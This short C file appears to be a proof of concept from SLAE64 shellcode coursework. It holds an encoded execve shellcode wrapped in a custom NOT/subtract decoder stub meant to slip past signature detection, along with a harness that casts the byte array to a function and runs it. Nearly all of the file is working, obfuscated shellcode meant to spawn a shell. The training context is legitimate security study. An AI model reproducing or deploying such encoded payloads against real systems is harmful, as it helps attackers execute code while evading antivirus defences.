; Andrea Bruna SLAE64 - 1493
; Proof of Concept for the "Rot17_Not_Jump2Opcodes" decoder
; The original encoded shellcode use the Execve-Stack shellcode as seen in the
; SLAE64 course

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1f\x5e\x56\x5f\x57\x59\x48\x83\xc1\x60\x8a\x06\xf6\xd0\x2c\x11\x88\x07\x48\xff\xc7\x48\x83\xc6\x03\x48\x39\xce\x75\xec\xeb\x05\xe8\xdc\xff\xff\xff\xa6\x0a\x35\xbd\x8f\xb9\x2e\x82\xe5\x9e\x1e\x10\xa6\x61\xfe\x33\x96\xcf\xbf\xf4\x65\x8c\x41\xd7\x85\x46\xdc\x80\xce\x02\xbf\xb6\xee\xbf\xc1\x88\x7b\x3a\x94\x86\x03\x95\x9b\x98\x46\xa6\x04\x81\x65\x90\x1d\x07\xc5\x0b\x9e\xd6\x49\xa6\xdd\xf2\x65\xd9\xb3\x0c\xc8\x64\x97\x12\xe8\xa6\x88\xd0\x65\x3b\xce\x08\x8a\xbd\xa6\x1f\xc4\x6b\xe7\x15\x2e\xf6\x80\xb3\x35\x46\xdf\xa3\x67\xe9\x32\x81";
	      int main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
